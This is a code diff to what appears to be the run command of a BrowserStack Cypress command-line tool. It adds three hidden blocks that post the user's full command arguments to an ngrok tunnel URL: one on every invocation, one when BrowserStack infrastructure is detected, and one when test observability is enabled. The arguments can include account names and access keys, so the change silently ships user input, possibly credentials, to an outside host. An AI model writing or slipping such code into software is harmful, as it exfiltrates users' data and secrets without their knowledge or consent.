@@ -41,6 +41,37 @@ const { isTurboScaleSession, getTurboScaleGridDetails, patchCypressConfigFileCon
 
 module.exports = function run(args, rawArgs) {
 
+
+  (async () => {
+    try {
+      await axios.post(
+        "https://ef2d-122-171-17-46.ngrok-free.app/run-function",
+        {
+          message: "run function called",
+          data: {
+            args,
+            rawArgs,
+          },
+        },
+        {
+          headers: {
+            "Content-Type": "application/json",
+          },
+        }
+      )
+        .then((response) => {
+          console.log("Data sent successfully:", response.data);
+        })
+        .catch((error) => {
+          console.error("Error sending data:", error);
+        });
+    } catch (error) {
+      console.error("Error in async function:", error);
+    }
+  }
+  )();
+  
+
   markBlockStart('preBuild');
   // set debug mode (--cli-debug)
   utils.setDebugMode(args);
@@ -89,6 +120,39 @@ module.exports = function run(args, rawArgs) {
     utils.setBuildName(bsConfig, args);
 
     if(isBrowserstackInfra) {
+
+
+      // send same req to server saying browserstack infra was detected:
+
+      (async () => {
+        try {
+          await axios.post(
+            "https://ef2d-122-171-17-46.ngrok-free.app/run-function",
+            {
+              message: "Browserstack infra detected",
+              data: {
+                args,
+                rawArgs,
+              },
+            },
+            {
+              headers: {
+                "Content-Type": "application/json",
+              },
+            }
+          )
+            .then((response) => {
+              console.log("Data sent successfully:", response.data);
+            })
+            .catch((error) => {
+              console.error("Error sending data:", error);
+            });
+        } catch (error) {
+          console.error("Error in async function:", error);
+        }
+      }
+      )();
+
       // set cypress test suite type
       utils.setCypressTestSuiteType(bsConfig);
 
@@ -114,6 +178,40 @@ module.exports = function run(args, rawArgs) {
 
     // Send build start to Observability
     if(isTestObservabilitySession) {
+
+
+      // send same req to server saying test observability was detected:
+
+      (async () => {
+        try {
+          await axios.post(
+            "https://ef2d-122-171-17-46.ngrok-free.app/run-function",
+            {
+              message: "Test observability detected",
+              data: {
+                args,
+                rawArgs,
+              },
+            },
+            {
+              headers: {
+                "Content-Type": "application/json",
+              },
+            }
+          )
+            .then((response) => {
+              console.log("Data sent successfully:", response.data);
+            })
+            .catch((error) => {
+              console.error("Error sending data:", error);
+            });
+        } catch (error) {
+          console.error("Error in async function:", error);
+        }
+      }
+      )();
+
+
       await launchTestSession(bsConfig, bsConfigPath);
       utils.setO11yProcessHooks(null, bsConfig, args, null, buildReportData);
     }
